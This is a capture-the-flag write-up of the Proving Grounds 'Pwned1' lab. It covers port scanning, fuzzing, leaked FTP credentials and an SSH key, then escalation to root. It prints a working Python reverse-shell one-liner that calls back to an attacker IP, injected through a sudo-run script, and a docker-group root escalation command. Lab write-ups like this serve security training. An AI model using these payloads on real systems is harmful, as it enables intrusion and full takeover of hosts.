----------------

### CTF: Proving Grounds
### Lab: Pwned1

----------------

![image](https://github.com/user-attachments/assets/18f57589-c5bf-4539-aedc-79653559e814)

----------------

### Reconnaissance

- Rustscan's output

          ❯ rustscan -a 192.168.234.95 -- -Pn -sC -sV
          .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
          | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
          | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
          `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
          The Modern Day Port Scanner.
          ________________________________________
          : https://discord.gg/GFrQsGy           :
          : https://github.com/RustScan/RustScan :
           --------------------------------------
          🌍HACK THE PLANET🌍
          
          [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
          [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
          [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
          Open 192.168.234.95:22
          Open 192.168.234.95:21
          Open 192.168.234.95:80
          [~] Starting Script(s)
          [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
          
          Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
          [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 04:16 EDT
          NSE: Loaded 156 scripts for scanning.
          NSE: Script Pre-scanning.
          NSE: Starting runlevel 1 (of 3) scan.
          Initiating NSE at 04:16
          Completed NSE at 04:16, 0.00s elapsed
          NSE: Starting runlevel 2 (of 3) scan.
          Initiating NSE at 04:16
          Completed NSE at 04:16, 0.00s elapsed
          NSE: Starting runlevel 3 (of 3) scan.
          Initiating NSE at 04:16
          Completed NSE at 04:16, 0.00s elapsed
          Initiating Parallel DNS resolution of 1 host. at 04:16
          Completed Parallel DNS resolution of 1 host. at 04:16, 0.02s elapsed
          DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
          Initiating Connect Scan at 04:16
          Scanning 192.168.234.95 [3 ports]
          Discovered open port 22/tcp on 192.168.234.95
          Discovered open port 21/tcp on 192.168.234.95
          Discovered open port 80/tcp on 192.168.234.95
          Completed Connect Scan at 04:16, 0.15s elapsed (3 total ports)
          Initiating Service scan at 04:16
          Scanning 3 services on 192.168.234.95
          Completed Service scan at 04:17, 6.41s elapsed (3 services on 1 host)
          NSE: Script scanning 192.168.234.95.
          NSE: Starting runlevel 1 (of 3) scan.
          Initiating NSE at 04:17
          Completed NSE at 04:17, 6.67s elapsed
          NSE: Starting runlevel 2 (of 3) scan.
          Initiating NSE at 04:17
          Completed NSE at 04:17, 1.28s elapsed
          NSE: Starting runlevel 3 (of 3) scan.
          Initiating NSE at 04:17
          Completed NSE at 04:17, 0.00s elapsed
          Nmap scan report for 192.168.234.95
          Host is up, received user-set (0.14s latency).
          Scanned at 2024-09-30 04:16:58 EDT for 15s
          
          PORT   STATE SERVICE REASON  VERSION
          21/tcp open  ftp     syn-ack vsftpd 3.0.3
          22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
          | ssh-hostkey: 
          |   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
          | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQPyAx8qSGlWyyuL5xu/6lWdbWs6VArMlRC71wt11kYKMGUTuVmPvLAdSAL66haaz0DCvquZMOmeYNHvM7/OjfmkwlIt3Wv53q/23AODRwPGkpj00QCNH/Vqt6Aw94Afo3etyW9SU3vzLC2F3mS18cqXApmV90NIH3d6ayhsDP+aPuQFoFqEzDxzy2RkosueaEERECT0auT+pTIwRMCHBEVX98Srd8+ax1yhWITRTGOYXcdocx0m9tooFUEH/a1P3RK3gBzCL63ZejMN9YofBl8y+CwCt+0nBLg+PtNjjskD9CaBwxUmH0/UM24z9BQecPn3IFmm3+P5U0z1DQEhf
          |   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
          | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDHWpwgF92XD4REIANL7X9lMcQSwcbhlNqwBvNi8l4SzQn5MjSzlBQzgcC7Kro57lCr0kImH+XdijG+r6lyps70=
          |   256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
          |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHPgRt1LF33Ttn5DuGuJJpmgbMd2ofAkqEt6gTOQK+WW
          80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
          |_http-server-header: Apache/2.4.38 (Debian)
          | http-methods: 
          |_  Supported Methods: HEAD GET POST OPTIONS
          |_http-title: Pwned....!!
          Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- FFUF's output

![image](https://github.com/user-attachments/assets/29cfa229-23a8-424f-8693-fa43002fc684)

- Robots.txt reveals two hidden directories

![image](https://github.com/user-attachments/assets/e541a09d-7f8e-4ea1-a167-19355b60a497)

- `Hidden_text` directory contains a wordlist for directory fuzzing

![image](https://github.com/user-attachments/assets/49e8a81c-7c3e-4f3f-91d0-4a170d2d6968)

- I fuzzed for directories with the wordlist and got one file match.

![image](https://github.com/user-attachments/assets/79ebe5ad-2f70-4cc0-b359-d4588500b256)

- Checking the source of `pwned.vuln` reveals  ftp creds

![image](https://github.com/user-attachments/assets/cdefa81c-731e-4490-8dd3-eb91b43a17b9)

- Ftp acesss as ftp user

![image](https://github.com/user-attachments/assets/99a559df-4dcb-46d4-8390-f4a18d927ed5)

- The share directory contains a note.txt and an id_rsa file

![image](https://github.com/user-attachments/assets/2122b286-7e81-4f08-8409-9a892a2e165d)

- The note.txt points to a user `ariana`

![image](https://github.com/user-attachments/assets/1dce5721-fb14-462c-be47-c792418671d4)

- SSH access as user `ariana`

![image](https://github.com/user-attachments/assets/b3dab1fb-5643-4fa1-bd01-a7379f900004)


### Pivoting to user `selena`

- I ran `sudo -l` which shows that we can run a shell script as user `selena`.

![image](https://github.com/user-attachments/assets/980768fc-a372-470a-aeaa-d7078bb3a4e2)

- I checked the shell script and discovered that we can execute shell commands with string stored in variable `msg` which is executed when it gets to statement `$msg 2</dev/null`.

![image](https://github.com/user-attachments/assets/7252a0b1-5147-4aec-bf9c-0a4f5bc8879e)

- I created a bash script in directory `tmp` and added a rev bash shell code to it.I applied this method to call the script later in `messenger.sh`.

   PAYLOAD-:```echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.156\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'" > /tmp/script;chmod +x /tmp/script```

![image](https://github.com/user-attachments/assets/406269d1-bafa-46d1-bc63-c33bf8ce5dea)

- Shell as selena

![image](https://github.com/user-attachments/assets/f48f53ba-84d3-4e79-ac31-b534ce1e51b1)

### Privesc with group `docker`

- I ran command `id` and discovered that user `selena` is part of group `docker`.

![image](https://github.com/user-attachments/assets/8db07196-c4f9-4fe7-b4fb-d809b6609fc4)

- I used the payload to spawn a root shell with docker.
  Payload-:```docker run -v /:/mnt --rm -it alpine chroot /mnt bash```

- Root as docker with host root directory mounted in it

![image](https://github.com/user-attachments/assets/ba2d563b-5c52-41f7-aa34-38df0bb05937)

- Root

  ![image](https://github.com/user-attachments/assets/dd0bbaf2-3d0d-4f53-acdd-83885b5a47b5)

-----------------

### THANKS FOR READING..!!!

----------------











